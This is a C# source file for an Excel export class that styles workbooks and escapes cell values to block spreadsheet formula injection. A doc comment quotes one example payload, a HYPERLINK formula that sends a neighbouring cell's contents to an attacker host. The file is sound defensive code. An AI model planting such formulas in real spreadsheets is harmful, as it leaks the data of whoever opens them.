using System.Globalization;
using ClosedXML.Excel;
using FcTelecom.Application.Abstractions;

namespace FcTelecom.Infrastructure.Export;

/// <summary>
/// Builds .xlsx workbooks from tabular data.
/// </summary>
/// <remarks>
/// The important part of this class is <see cref="EscapeForSpreadsheet"/>. Everything else
/// is formatting.
/// </remarks>
public sealed class ExcelExporter : IExcelExporter
{
    public byte[] Build(
        string sheetName,
        IReadOnlyList<string> headers,
        IEnumerable<IReadOnlyList<object?>> rows)
    {
        ArgumentNullException.ThrowIfNull(headers);
        ArgumentNullException.ThrowIfNull(rows);

        using var workbook = new XLWorkbook();
        IXLWorksheet sheet = workbook.Worksheets.Add(SanitizeSheetName(sheetName));

        for (int column = 0; column < headers.Count; column++)
        {
            IXLCell cell = sheet.Cell(1, column + 1);
            cell.Value = headers[column];
            cell.Style.Font.Bold = true;
            cell.Style.Fill.BackgroundColor = XLColor.FromHtml("#1F4E79");
            cell.Style.Font.FontColor = XLColor.White;
        }

        int rowIndex = 2;

        foreach (IReadOnlyList<object?> row in rows)
        {
            for (int column = 0; column < row.Count && column < headers.Count; column++)
            {
                SetCellValue(sheet.Cell(rowIndex, column + 1), row[column]);
            }

            rowIndex++;
        }

        sheet.SheetView.FreezeRows(1);

        if (headers.Count > 0 && rowIndex > 2)
        {
            sheet.Range(1, 1, rowIndex - 1, headers.Count).SetAutoFilter();
        }

        sheet.Columns().AdjustToContents(1, 100, 8, 60);

        using var stream = new MemoryStream();
        workbook.SaveAs(stream);
        return stream.ToArray();
    }

    private static void SetCellValue(IXLCell cell, object? value)
    {
        switch (value)
        {
            case null:
                cell.Value = Blank.Value;
                break;

            case string text:
                // Written as text, after escaping. Letting Excel infer a type from a string
                // is how a circuit ID like "60.LXFN.845512" becomes a number in scientific
                // notation, and how a leading-zero account number loses its zero.
                cell.SetValue(EscapeForSpreadsheet(text));
                cell.Style.NumberFormat.Format = "@";
                break;

            case decimal money:
                cell.Value = money;
                cell.Style.NumberFormat.Format = "#,##0.00";
                break;

            case double number:
                cell.Value = number;
                break;

            case int or long or short:
                cell.Value = Convert.ToDouble(value, CultureInfo.InvariantCulture);
                cell.Style.NumberFormat.Format = "#,##0";
                break;

            case bool flag:
                cell.Value = flag ? "Yes" : "No";
                break;

            case DateOnly date:
                cell.Value = date.ToDateTime(TimeOnly.MinValue);
                cell.Style.DateFormat.Format = "yyyy-mm-dd";
                break;

            case DateTime timestamp:
                cell.Value = timestamp;
                cell.Style.DateFormat.Format = "yyyy-mm-dd hh:mm";
                break;

            case Enum enumValue:
                cell.SetValue(enumValue.ToString());
                break;

            default:
                cell.SetValue(EscapeForSpreadsheet(
                    Convert.ToString(value, CultureInfo.InvariantCulture) ?? string.Empty));
                break;
        }
    }

    /// <summary>
    /// Neutralises spreadsheet formula injection.
    /// </summary>
    /// <remarks>
    /// A cell whose value begins <c>=</c>, <c>+</c>, <c>-</c>, <c>@</c>, or a tab/CR is
    /// interpreted as a formula by Excel, LibreOffice, and Google Sheets. A contract note
    /// containing <c>=HYPERLINK("http://attacker/"&amp;A1,"Click")</c> would then execute
    /// when someone in Finance opens an export — exfiltrating the adjacent cell.
    /// <para>
    /// The data reaching this method is not attacker-supplied in the usual sense; it was
    /// typed by a colleague or imported from a carrier's CSV. That is exactly why it is
    /// worth escaping: nobody is watching those fields for hostile content, and a carrier
    /// billing file is a plausible delivery vehicle.
    /// </para>
    /// <para>
    /// The leading apostrophe forces text interpretation and is not displayed by the
    /// spreadsheet application.
    /// </para>
    /// </remarks>
    internal static string EscapeForSpreadsheet(string value)
    {
        if (value.Length == 0)
        {
            return value;
        }

        return value[0] switch
        {
            '=' or '+' or '-' or '@' or '\t' or '\r' => "'" + value,
            _ => value,
        };
    }

    /// <summary>
    /// Excel rejects sheet names over 31 characters or containing <c>: \ / ? * [ ]</c>.
    /// </summary>
    private static string SanitizeSheetName(string name)
    {
        if (string.IsNullOrWhiteSpace(name))
        {
            return "Export";
        }

        char[] invalid = [':', '\\', '/', '?', '*', '[', ']'];
        string cleaned = new([.. name.Where(character => !invalid.Contains(character))]);

        return cleaned.Length switch
        {
            0 => "Export",
            > 31 => cleaned[..31],
            _ => cleaned,
        };
    }
}
